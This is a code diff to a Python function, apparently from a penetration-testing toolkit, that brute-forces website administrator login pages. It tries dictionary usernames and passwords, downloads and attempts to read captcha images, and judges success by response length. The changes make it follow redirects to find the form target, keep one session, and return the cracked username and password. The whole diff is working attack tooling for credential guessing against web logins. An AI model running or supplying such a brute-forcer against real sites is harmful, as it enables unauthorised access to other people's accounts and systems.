@@ -36,6 +36,7 @@ def crack_admin_login_url(
         yanzhengma_len=0):
     # 这里的yanzhengma_len是要求的验证码长度,默认不设置,自动获得,根据不同情况人为设置不同值效果更好
     # 爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证
+    import requests
     figlet2file("cracking admin login url", 0, True)
     print("cracking admin login url:%s" % url)
     print("正在使用吃奶的劲爆破登录页面...")
@@ -65,6 +66,7 @@ def crack_admin_login_url(
                 yanzhengma}
 
         try_time[0] += 1
+        
         html = s.post(post_url, values).text
         USERNAME_PASSWORD = "(" + username + ":" + \
             password + ")" + (52 - len(password)) * " "
@@ -95,6 +97,7 @@ def crack_admin_login_url(
             string = "cracked admin login url:%s username and password:(%s:%s)" % (
                 url, username, password)
             CLIOutput().good_print(string, "red")
+            return_string[0]=string
             print("you spend time:" + str(end - start[0]))
             http_domain_value = get_http_domain_from_url(url)
             # 经验证terminate()应该只能结束当前线程,不能达到结束所有线程
@@ -135,11 +138,21 @@ def crack_admin_login_url(
     get_result = get_user_and_pass_form_from_url(url)
     user_form_name = get_result['user_form_name']
     pass_form_name = get_result['pass_form_name']
-    # print(user_form_name)
-    # print(pass_form_name)
-    # input()
+
+    #print(user_form_name)
+    #print(pass_form_name)
+    #input()
     form_action_url = get_result['form_action_url']
-    post_url = url[:-len(url.split("/")[-1])] + form_action_url
+    r=requests.get(url)
+    #这里之所以要获取redirectUrl是为了支持当设置待爆破页面为"http://127.0.0.1/administrator"时也支持爆破(在浏览
+    #器中输入http://127.0.0.1/administrator后会跳转到"http://127.0.0.1/administrator/",但是实际上
+    #"http://127.0.0.1/administrator/"才是有效的管理员页面)
+    redirectUrl=r.url
+
+    if redirectUrl[-1]=="/":
+        post_url=redirectUrl+form_action_url
+    else:
+        post_url = redirectUrl[:-len(redirectUrl.split("/")[-1])] + form_action_url
     if user_form_name is None:
         print("user_form_name is None")
         return
@@ -150,6 +163,7 @@ def crack_admin_login_url(
     # 如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功
     logined_least_length = unlogin_length + unlogin_length / 2
     get_flag = [0]
+    return_string=[""]
     try_time = [0]
     sum = [0]
     start = [0]
@@ -166,6 +180,9 @@ def crack_admin_login_url(
     # print("现在打印是否找到了验证码表单")
     # print(find_yanzhengma)
     # input()
+
+    s = requests.session()
+
     if find_yanzhengma:
         yanzhengma_form_name = find_yanzhengma['yanzhengma_form_name']
         yanzhengma_src = find_yanzhengma['yanzhengma_src']
@@ -176,8 +193,6 @@ def crack_admin_login_url(
 
             # 这里不用exp10it模块中打包好的get_request和post_request来发送request请求,因为要保留session在服务器需要
             #yanzhengma = get_string_from_url_or_picfile(yanzhengma_src)
-            import requests
-            s = requests.session()
             import shutil
             response = s.get(yanzhengma_src, stream=True)
             with open('img.png', 'wb') as out_file:
@@ -211,10 +226,11 @@ def crack_admin_login_url(
             username = re.sub(r'(\s)$', '', username)
             crack_admin_login_url_inside_func(url, username, pass_dict_file)
 
-    return get_flag[0]
+    #return get_flag[0]
+    return return_string[0]
 if __name__ == '__main__':
+    import sys
     url = sys.argv[1]
     # 下面加4是因为http://localhost/admin.php中验证码为4,在不确定验证码长度情况下下面第二个参数不用写
     # crack_admin_login_url(url,yanzhengma_len=4)
     crack_admin_login_url(url)
-
